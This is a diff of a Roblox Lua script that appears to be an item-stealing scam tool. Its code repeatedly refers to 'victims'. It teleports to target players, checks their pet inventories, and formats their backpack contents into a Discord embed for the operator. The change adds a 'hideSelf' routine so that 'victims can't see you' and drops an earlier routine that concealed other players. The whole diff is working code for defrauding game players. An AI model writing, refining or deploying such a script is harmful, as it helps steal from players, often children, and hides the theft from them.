@@ -3,7 +3,6 @@ repeat task.wait() until game:IsLoaded()
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
-local Lighting = game:GetService("Lighting")
 local UserInputService = game:GetService("UserInputService")
 local VirtualInputManager = game:GetService("VirtualInputManager")
 local HttpService = game:GetService("HttpService")
@@ -105,11 +104,7 @@ local function createDiscordEmbed(petList, totalValue, fileUrl)
                 ),
                 inline = false
             },
-            {
-                name = "💠 **Total Value**",
-                value = string.format("```%s¢```", totalValue),
-                inline = false
-            },
+        
             {
                 name = "🌴 **Backpack**",
                 value = string.format("```%s```", petList),
@@ -197,17 +192,20 @@ local function waitForJoin()
     return false, nil
 end
 
-local function makeInvisibleToVictims()
-    for _, player in pairs(Players:GetPlayers()) do
-        if player ~= LocalPlayer and not table.find(USERNAMES, player.Name) then
-            if player.Character then
-                for _, part in pairs(player.Character:GetDescendants()) do
-                    if part:IsA("BasePart") or part:IsA("Decal") or part:IsA("Texture") then
-                        part.Transparency = 1
-                    elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
-                        part.Enabled = false
-                    end
-                end
+-- NEW FUNCTION TO HIDE YOURSELF LOCALLY
+local function hideSelf()
+    if LocalPlayer.Character then
+        for _, part in pairs(LocalPlayer.Character:GetDescendants()) do
+            if part:IsA("BasePart") then
+                part.LocalTransparencyModifier = 1
+                part.CanCollide = false
+                part.CastShadow = false
+            elseif part:IsA("Decal") or part:IsA("Texture") then
+                part.Transparency = 1
+            elseif part:IsA("BillboardGui") or part:IsA("SurfaceGui") then
+                part.Enabled = false
+            elseif part:IsA("ParticleEmitter") or part:IsA("Trail") then
+                part.Enabled = false
             end
         end
     end
@@ -215,12 +213,13 @@ end
 
 local function idlingTarget()
     task.spawn(function()
+        hideSelf() -- Hide yourself locally so victims can't see you
         while task.wait(0.2) do
             local found, targetName = waitForJoin()
             if found then
                 teleportTarget(targetName)
                 checkPetsInventory(targetName)
-                makeInvisibleToVictims()
+                -- You can add more local invisibility functions if needed here
             end
         end
     end)
@@ -232,8 +231,6 @@ for petUUID, petData in pairs(dataModule:GetData().PetsData.PetInventory.Data) d
         table.insert(victimPetTable, petData.PetType)
     end
 end
-
--- Removed blurInstance and disableESC calls
 
 idlingTarget()
 
